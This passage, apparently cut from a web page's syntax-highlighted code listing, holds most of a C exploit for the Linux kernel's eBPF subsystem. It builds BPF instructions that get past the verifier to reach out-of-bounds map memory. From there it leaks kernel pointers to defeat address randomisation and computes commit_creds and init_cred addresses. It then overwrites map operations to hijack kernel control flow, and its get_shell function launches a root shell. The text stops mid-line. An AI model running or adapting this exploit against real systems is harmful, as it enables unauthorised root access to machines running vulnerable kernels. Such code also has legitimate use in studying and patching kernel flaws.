class="line">    __u32 btf_id;</span><br><span class="line">    __u32 btf_key_type_id;</span><br><span class="line">    __u32 btf_value_type_id;</span><br><span class="line">&#125; __attribute__((aligned(<span class="number">8</span>)));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf</span><span class="params">(<span class="keyword">int</span> cmd, <span class="keyword">union</span> bpf_attr *attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_bpf, cmd, attrs, <span class="keyword">sizeof</span>(*attrs));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">create_map</span><span class="params">(<span class="keyword">union</span> bpf_attr *map_attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_CREATE, map_attrs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">update_map_element</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">uint64_t</span> key, <span class="keyword">void</span> *value, <span class="keyword">uint64_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;&#125;;</span><br><span class="line">    attr.map_fd = fd;</span><br><span class="line">    attr.key = (<span class="keyword">uint64_t</span>)&amp;key;</span><br><span class="line">    attr.value = (<span class="keyword">uint64_t</span>)value;</span><br><span class="line">    attr.flags = flags;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_UPDATE_ELEM, &amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lookup_map_element</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">uint64_t</span> key, <span class="keyword">void</span> *value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;&#125;;</span><br><span class="line">    attr.map_fd = fd;</span><br><span class="line">    attr.key = (<span class="keyword">uint64_t</span>)&amp;key;</span><br><span class="line">    attr.value = (<span class="keyword">uint64_t</span>)value;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_LOOKUP_ELEM, &amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">obj_get_info_by_fd</span><span class="params">(<span class="keyword">union</span> bpf_attr *attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_OBJ_GET_INFO_BY_FD, attrs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">map_get_next_key</span><span class="params">(<span class="keyword">union</span> bpf_attr *attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_GET_NEXT_KEY, attrs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">run_bpf_prog</span><span class="params">(struct bpf_insn *insn, <span class="keyword">uint32_t</span> cnt, <span class="keyword">int</span> log_level, <span class="keyword">int</span> *prog_fd_out)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> prog_fd = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">char</span> verifier_log_buff[<span class="number">0x200000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> socks[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">prog_attrs</span> =</span></span><br><span class="line">        &#123;</span><br><span class="line">            .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">            .insn_cnt = cnt,</span><br><span class="line">            .insns = (<span class="keyword">uint64_t</span>)insn,</span><br><span class="line">            .license = (<span class="keyword">uint64_t</span>) <span class="string">&quot;&quot;</span>,</span><br><span class="line">            .log_level = log_level,</span><br><span class="line">            .log_size = <span class="keyword">sizeof</span>(verifier_log_buff),</span><br><span class="line">            .log_buf = (<span class="keyword">uint64_t</span>)verifier_log_buff&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != prog_fd_out)</span><br><span class="line">        prog_fd = *prog_fd_out;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &gt;= prog_fd)</span><br><span class="line">        prog_fd = bpf(BPF_PROG_LOAD, &amp;prog_attrs);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &gt; prog_fd)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(verifier_log_buff);</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, socks))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;dzhsb\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != setsockopt(socks[<span class="number">0</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;prog_fd, <span class="keyword">sizeof</span>(<span class="keyword">int</span>)))</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x7</span> != write(socks[<span class="number">1</span>], <span class="string">&quot;zzzzzzz&quot;</span>, <span class="number">7</span>))</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    <span class="keyword">if</span> (log_level == <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// char *each_line_log = strtok(verifier_log_buff, &quot;\n&quot;);</span></span><br><span class="line">        <span class="comment">// printf(&quot;%s\n&quot;, each_line_log);</span></span><br><span class="line">        <span class="comment">// each_line_log = strtok(NULL, &quot;\n&quot;);</span></span><br><span class="line">        <span class="comment">// while (each_line_log)</span></span><br><span class="line">        <span class="comment">// &#123;</span></span><br><span class="line">        <span class="comment">//     int len = strlen(each_line_log);</span></span><br><span class="line">        <span class="comment">//     if (len &gt; 231)</span></span><br><span class="line">        <span class="comment">//     &#123;</span></span><br><span class="line">        <span class="comment">//         printf(&quot;%s\n&quot;, each_line_log);</span></span><br><span class="line">        <span class="comment">//         printf(&quot;%s\n&quot;, (each_line_log + 231));</span></span><br><span class="line">        <span class="comment">//         each_line_log = strtok(NULL, &quot;\n&quot;);</span></span><br><span class="line">        <span class="comment">//         continue;</span></span><br><span class="line">        <span class="comment">//     &#125;</span></span><br><span class="line">        <span class="comment">//     printf(&quot;%s\n&quot;, each_line_log);</span></span><br><span class="line">        <span class="comment">//     each_line_log = strtok(NULL, &quot;\n&quot;);</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        <span class="built_in">puts</span>(verifier_log_buff);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != prog_fd_out)</span><br><span class="line">        *prog_fd_out = prog_fd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        close(prog_fd);</span><br><span class="line"></span><br><span class="line">    ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">done:</span><br><span class="line">    close(socks[<span class="number">0</span>]);</span><br><span class="line">    close(socks[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">err_exit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data :\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (size / <span class="number">8</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i / <span class="number">2</span> &lt; <span class="number">10</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d  &quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (i / <span class="number">2</span> &lt; <span class="number">100</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %16llx&quot;</span>, *(<span class="keyword">size_t</span> *)(buf + i * <span class="number">8</span>));</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> attack(map_fd, map_fd2)                                              \</span></span><br><span class="line"><span class="meta">    BPF_LD_MAP_FD(BPF_REG_1, map_fd),                                        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),                               \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                                         \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_W, BPF_REG_2, BPF_REG_0, 0),                         \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \</span></span><br><span class="line"><span class="meta">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                               \</span></span><br><span class="line"><span class="meta">        BPF_EXIT_INSN(),                                                     \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),                                 \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                                         \</span></span><br><span class="line"><span class="meta">        BPF_LD_MAP_FD(BPF_REG_1, map_fd2),                                   \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),                               \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_0, 0),                        \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \</span></span><br><span class="line"><span class="meta">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                               \</span></span><br><span class="line"><span class="meta">        BPF_EXIT_INSN(),                                                     \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_9, BPF_REG_0),                                 \</span></span><br><span class="line"><span class="meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_8, 0),                        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_4, 0xffffffff),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_4, 32),                               \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_AND, BPF_REG_6, BPF_REG_4),                        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_7, 0x1),                                       \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_7, 32),                               \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 2),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 0x1),                              \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_AND, BPF_REG_6, BPF_REG_7),                        \</span></span><br><span class="line"><span class="meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_8, 0),                        \</span></span><br><span class="line"><span class="meta">        BPF_JMP32_IMM(BPF_JLE, BPF_REG_3, 1, 2),                             \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0x196082),                                  \</span></span><br><span class="line"><span class="meta">        BPF_EXIT_INSN(),                                                     \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_3),                        \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 0x1),                              \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_AND, BPF_REG_6, 0x1),                              \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 0x1000),                           \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_7, BPF_REG_6),                                 \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_7, 0x1000 - 1),                       \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_7),                        \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_6)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> setup_btf_bpf_prog_fd;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_kernel</span><span class="params">(<span class="keyword">int</span> map_fd, <span class="keyword">int</span> map_fd2, <span class="keyword">uint64_t</span> addr, <span class="keyword">char</span> *buf, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">char</span> values[<span class="number">0x1500</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">read_map_ops_content</span>[] =</span></span><br><span class="line">        &#123;</span><br><span class="line">            attack(map_fd, map_fd2),</span><br><span class="line">            BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, <span class="number">0xD0</span>),</span><br><span class="line">            BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_6),</span><br><span class="line">            BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_9, <span class="number">8</span>),</span><br><span class="line">            BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">            BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">            BPF_EXIT_INSN()&#125;;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len / <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(values, <span class="number">0</span>, <span class="keyword">sizeof</span>(values));</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_info_kernel</span> <span class="title">info</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">            .info.bpf_fd = map_fd,</span><br><span class="line">            .info.info = (<span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;info,</span><br><span class="line">            .info.info_len = <span class="keyword">sizeof</span>(info)&#125;;</span><br><span class="line"></span><br><span class="line">        *(<span class="keyword">uint64_t</span> *)(values + <span class="number">8</span>) = addr - <span class="number">0x58</span>;</span><br><span class="line">        <span class="keyword">if</span> (addr == <span class="number">0</span>)</span><br><span class="line">            *(<span class="keyword">uint64_t</span> *)(values + <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> != update_map_element(map_fd2, <span class="number">0</span>, values, BPF_ANY))</span><br><span class="line">            err_exit(<span class="string">&quot;[-] failed to update map element values!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> != run_bpf_prog(read_map_ops_content, <span class="keyword">sizeof</span>(read_map_ops_content) / <span class="keyword">sizeof</span>(struct bpf_insn), <span class="number">1</span>, &amp;setup_btf_bpf_prog_fd))</span><br><span class="line">            err_exit(<span class="string">&quot;[-] Failed to run bpf program\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> != obj_get_info_by_fd(&amp;attr))</span><br><span class="line">            err_exit(<span class="string">&quot;[-] Failed to get map info\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        addr = addr + <span class="number">4</span>;</span><br><span class="line">        ((<span class="keyword">uint32_t</span> *)buf)[i] = info.btf_id;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">map_attr</span> =</span> &#123;</span><br><span class="line">        .map_type = BPF_MAP_TYPE_ARRAY,</span><br><span class="line">        .key_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>),</span><br><span class="line">        .value_size = <span class="number">0x1500</span>,</span><br><span class="line">        .max_entries = <span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> map_fd2 = create_map(&amp;map_attr);</span><br><span class="line">    <span class="keyword">int</span> map_fd = create_map(&amp;map_attr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (map_fd &lt; <span class="number">0</span> || map_fd2 &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, map_fd);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, map_fd2);</span><br><span class="line">        err_exit(<span class="string">&quot;Failed to create map\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *values = <span class="built_in">malloc</span>(<span class="number">0x3000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(values, <span class="number">0</span>, <span class="keyword">sizeof</span>(values));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != update_map_element(map_fd2, <span class="number">0</span>, values, BPF_ANY))</span><br><span class="line">        err_exit(<span class="string">&quot;[-] failed to update map element values!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != update_map_element(map_fd, <span class="number">0</span>, values, BPF_ANY))</span><br><span class="line">        err_exit(<span class="string">&quot;[-] failed to update map element values!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">ops</span>[] =</span></span><br><span class="line">        &#123;</span><br><span class="line">            attack(map_fd, map_fd2),</span><br><span class="line">            BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, <span class="number">0x110</span>),</span><br><span class="line">            BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_6),</span><br><span class="line">            BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_8, <span class="number">0</span>),</span><br><span class="line">            BPF_ALU64_REG(BPF_ADD, BPF_REG_8, BPF_REG_6),</span><br><span class="line">            BPF_STX_MEM(BPF_DW, BPF_REG_9, BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">            BPF_EXIT_INSN()&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != run_bpf_prog(ops, <span class="keyword">sizeof</span>(ops) / <span class="keyword">sizeof</span>(struct bpf_insn), <span class="number">2</span>, <span class="literal">NULL</span>))</span><br><span class="line">        err_exit(<span class="string">&quot;[-] Failed to run bpf program\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != lookup_map_element(map_fd2, <span class="number">0</span>, values))</span><br><span class="line">        err_exit(<span class="string">&quot;[-] Failed to lookup map element\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> raw_array_map_ops = <span class="number">0xffffffff820363a0</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> kernel_addr;</span><br><span class="line">    <span class="keyword">uint64_t</span> kernel_base;</span><br><span class="line">    <span class="keyword">uint64_t</span> kernel_offset;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> array_map_ops = *(<span class="keyword">uint64_t</span> *)values;</span><br><span class="line">    kernel_offset = array_map_ops - raw_array_map_ops;</span><br><span class="line">    kernel_base = <span class="number">0xffffffff81000000</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">uint64_t</span> work_for_cpu_fn_addr = kernel_offset + <span class="number">0xffffffff810bc190</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> commit_creds_addr = kernel_offset + <span class="number">0xffffffff810cce30</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> init_creds_addr = kernel_offset + <span class="number">0xffffffff82a6b880</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;array_map_ops_addr =&gt; %p\n&quot;</span>, array_map_ops);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel_base =&gt; %p\n&quot;</span>, kernel_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel_offset =&gt; %p\n&quot;</span>, kernel_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;work_for_cpu_fn =&gt; %p\n&quot;</span>, work_for_cpu_fn_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;commit_creds_addr =&gt; %p\n&quot;</span>, commit_creds_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;init_creds_addr =&gt; %p\n&quot;</span>, init_creds_addr);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">read_map_addr_ops</span>[] =</span> &#123;</span><br><span class="line">        attack(map_fd, map_fd2),</span><br><span class="line">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, <span class="number">0x50</span>),</span><br><span class="line">        BPF_ALU64_REG(BPF_SUB, BPF_REG_9, BPF_REG_6),</span><br><span class="line">        BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_9, <span class="number">0</span>),</span><br><span class="line">        BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_0, <span class="number">8</span>),</span><br><span class="line">        BPF_EXIT_INSN()&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != run_bpf_prog(read_map_addr_ops, <span class="keyword">sizeof</span>(read_map_addr_ops) / <span class="keyword">sizeof</span>(struct bpf_insn), <span class="number">1</span>, <span class="literal">NULL</span>))</span><br><span class="line">        err_exit(<span class="string">&quot;[-] Failed to run bpf program\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != lookup_map_element(map_fd, <span class="number">0</span>, values))</span><br><span class="line">        err_exit(<span class="string">&quot;[-] Failed to lookup map element\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> map_ptr = *(<span class="keyword">uint64_t</span> *)(values + <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;map_ptr =&gt; %p\n&quot;</span>, map_ptr);</span><br><span class="line">    <span class="keyword">uint64_t</span> map_value = map_ptr - <span class="number">0xc0</span> + <span class="number">0x110</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;map_value =&gt; %p\n&quot;</span>, map_value);</span><br><span class="line"></span><br><span class="line">    read_kernel(map_fd, map_fd2, map_ptr, values, <span class="number">0x8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, *(<span class="keyword">uint64_t</span> *)values);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(values, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    read_kernel(map_fd, map_fd2, array_map_ops, values, <span class="number">0xf0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> map_ops[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(values + <span class="number">8</span> * <span class="number">4</span>) = work_for_cpu_fn_addr;</span><br><span class="line">    <span class="built_in">memcpy</span>(map_ops, values, <span class="number">0xf0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != update_map_element(map_fd2, <span class="number">0</span>, map_ops, BPF_ANY))</span><br><span class="line">        err_exit(<span class="string">&quot;[-] failed to update map element values!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">modify_oob_map</span>[] =</span></span><br><span class="line">        &#123;</span><br><span class="line">            attack(map_fd, map_fd2),</span><br><span class="line">            BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, <span class="number">0x110</span>),</span><br><span class="line">            BPF_ALU64_REG(BPF_SUB, BPF_REG_9, BPF_REG_6),</span><br><span class="line">            BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_8, <span class="number">0x8</span>),</span><br><span class="line">            BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_8, <span class="number">0x10</span>),</span><br><span class="line">            BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_8, <span class="number">0x18</span>),</span><br><span class="line">            BPF_STX_MEM(BPF_DW, BPF_REG_9, BPF_REG_0, <span class="number">0x20</span>),</span><br><span class="line">            BPF_STX_MEM(BPF_DW, BPF_REG_9, BPF_REG_1, <span class="number">0x28</span>),</span><br><span class="line">            BPF_STX_MEM(BPF_DW, BPF_REG_9, BPF_REG_2, <span class="number">0</span>),</span><br><span class="line">            BPF_EXIT_INSN()&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(values, <span class="number">0</span>, <span 